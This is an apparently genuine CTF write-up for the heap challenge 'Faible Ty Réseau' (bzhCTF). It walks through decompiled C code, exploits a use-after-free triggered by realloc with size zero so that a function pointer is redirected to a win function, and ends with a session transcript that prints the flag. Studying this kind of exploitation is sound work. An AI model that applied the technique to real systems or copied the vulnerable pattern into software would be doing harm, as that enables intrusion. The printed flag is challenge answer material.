Faible Ty Réseau is a basic heap-like challenge, it allows us to create a configuration, edit it, call a function pointer on it and finally to free it:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  while ( 1 )
  {
    puts(aVousN);
    printf(a1ModifierLesPa, argv);
    fflush(stdout);
    v4 = 0;
    argv = &v4;
    __isoc99_scanf(&unk_21F3, &v4);
    switch ( v4 )
    {
      case 0:
        printf("wtf ?");
        fflush(stdout);
        break;
      case 1:
        create();
        break;
      case 2:
        delete();
        break;
      case 3:
        exec();
        break;
      case 4:
        show();
        break;
      case 5:
        exit(0);
      default:
        continue;
    }
  }
}
```

They are many ways to pwn the challenge, I did it by taking advantage of the UAF in `create`:
```c
__int64 create()
{
  int v1; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  void *buf; // [rsp+10h] [rbp-10h]
  void *v4; // [rsp+18h] [rbp-8h]

  if ( !ptr )
  {
    ptr = malloc(0x18uLL);
    byte_4104 = 1;
  }
  buf = calloc(0x19uLL, 1uLL);
  write(1, "New hostname : ", 0x10uLL);
  v1 = read(1, buf, 0x18uLL);
  *(buf + v1) = 0;
  v4 = calloc(0x19uLL, 1uLL);
  printf("\nNew host : ");
  fflush(stdout);
  v2 = read(1, v4, 0x18uLL);
  *(v4 + v2) = 0;
  fflush(stdout);
  if ( byte_4104 != 1 )
  {
    fflush(stdout);
    realloc(ptr, v1 + v2 - 2);
    *ptr = buf;
    *(ptr + 1) = v4;
    *(ptr + 2) = sub_1259;
  }
  byte_4104 = 0;
  *ptr = buf;
  *(ptr + 1) = v4;
  *(ptr + 2) = sub_1259;
  fflush(stdout);
  alloc_admin();
  return 0LL;
}
```

As we can see, if ptr is not `NULL` and that we enter only one byte for each read (by sending only \n for example), then we will trigger a `realloc(ptr, 1 + 1 - 2)` which frees `ptr`, `ptr` being freed the freelist is pointing on `ptr`. Now let's take a look at the `alloc_admin` function:
```c
__int64 alloc_admin()
{
  char *v1; // [rsp+0h] [rbp-10h]
  char *v2; // [rsp+8h] [rbp-8h]

  fflush(stdout);
  qword_40F8 = malloc(0x18uLL);
  fflush(stdout);
  v1 = malloc(0xAuLL);
  fflush(stdout);
  strcpy(v1, "Admin");
  fflush(stdout);
  v2 = malloc(0xAuLL);
  fflush(stdout);
  strcpy(v2, "000000000");
  fflush(stdout);
  *qword_40F8 = v1;
  *(qword_40F8 + 8) = v2;
  *(qword_40F8 + 16) = win;
  fflush(stdout);
  return 0LL;
}
```

By allocating `0x18` bytes, it gets the previous freed `ptr` and writes over a few fields like the function pointer. Then we just have to call the `exec` function which will call the win function:
```c
int exec()
{
  if ( ptr )
    return (*(ptr + 2))();
  printf("Pas de configuration !");
  return fflush(stdout);
}
```

Which gives us:
```
nasm@off:~/ctf/bzhCTF/pwn$ ./FTM
Vous n'êtes pas connecté (anonyme)
1. Modifier les paramètres de connexion
2. Restaurer la configutation d'usine
3. Tester la configuration
4. Voir la configuration courante
5. Quitter (au revoir !)
>>>> 1
New hostname : dumb

New host : dumb
Vous n'êtes pas connecté (anonyme)
1. Modifier les paramètres de connexion
2. Restaurer la configutation d'usine
3. Tester la configuration
4. Voir la configuration courante
5. Quitter (au revoir !)
>>>> 1
New hostname : 

New host : 
Vous n'êtes pas connecté (anonyme)
1. Modifier les paramètres de connexion
2. Restaurer la configutation d'usine
3. Tester la configuration
4. Voir la configuration courante
5. Quitter (au revoir !)
>>>> 3
BZHCTF{9024b719d4449bc9827478e50f0279427ccb542cc3ecdec21fce38c52b29561c}
```
